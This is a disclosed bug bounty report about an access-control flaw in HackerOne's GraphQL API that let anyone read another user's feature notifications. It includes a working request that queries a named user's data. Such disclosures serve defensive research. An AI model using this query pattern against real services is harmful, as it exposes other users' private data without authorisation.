# Can read features from any user

## Report Details
- **Report ID**: 316810
- **URL**: https://hackerone.com/reports/316810
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-16T15:31:02.788Z
- **Disclosed**: 2018-03-12T12:49:00.503Z

## Reporter
- **Username**: firs0v
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
An attacker can read feature notifications from any user. 
Just need to change `me` to `user(username:"filedescriptor")` in your request to get the features.

### Steps To Reproduce

`POST /graphql HTTP/1.1
Host: hackerone.com
{"query":"query New_feature {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  user(username:\"filedescriptor\") {\n    id, username\n,  reputation,   new_feature_notification {\n      name,\n      description,\n      url,\n      id\n    }\n  },\n  id\n}","variables":{}}`

## Impact

An attacker can read unread features from any user and have to know how long this user did not visit the hackerone (as example). Probably in future you will make individual feature for individual user. 
So now it's a bug.

## Attachments
- _________2018-02-16_18.18.31.png
- _________2018-02-16_18.18.49.png
